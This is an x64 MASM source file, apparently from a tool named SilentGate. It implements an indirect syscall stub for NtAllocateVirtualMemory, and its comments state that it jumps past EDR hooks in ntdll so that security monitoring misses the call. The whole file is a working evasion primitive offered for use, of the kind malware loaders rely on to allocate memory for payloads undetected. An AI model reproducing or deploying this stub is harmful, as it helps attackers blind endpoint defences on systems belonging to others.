; ===========================================================
; SilentGate - Indirect Syscall Stub (x64 MASM)
; ===========================================================
; API    : NtAllocateVirtualMemory
; SSN    : 24 (0x18)
; Author : JarDan
; License: MIT
;
; HOW THIS WORKS:
;   Normal call path (EDR catches this):
;     Your code -> NtAllocateVirtualMemory in ntdll -> [EDR HOOK] -> kernel
;
;   Indirect syscall path (EDR misses this):
;     Your code -> SG_NtAllocateVirtualMemory -> loads SSN -> jumps into
;     clean ntdll stub -> syscall executes from ntdll space -> kernel
;
;   The EDR hook sits at the START of NtAllocateVirtualMemory in ntdll.
;   We never touch that hooked address.
;   We jump PAST the hook into a clean syscall gadget in ntdll.
; ===========================================================

.code

EXTERN SG_NtAllocateVirtualMemory_addr:QWORD  ; address of clean ntdll gadget

SG_NtAllocateVirtualMemory PROC
    mov r10, rcx          ; mirror rcx into r10 (Windows x64 ABI)
    mov eax, 18h    ; load SSN 24 into eax
    jmp QWORD PTR [SG_NtAllocateVirtualMemory_addr]  ; indirect jump to clean ntdll stub
SG_NtAllocateVirtualMemory ENDP

END
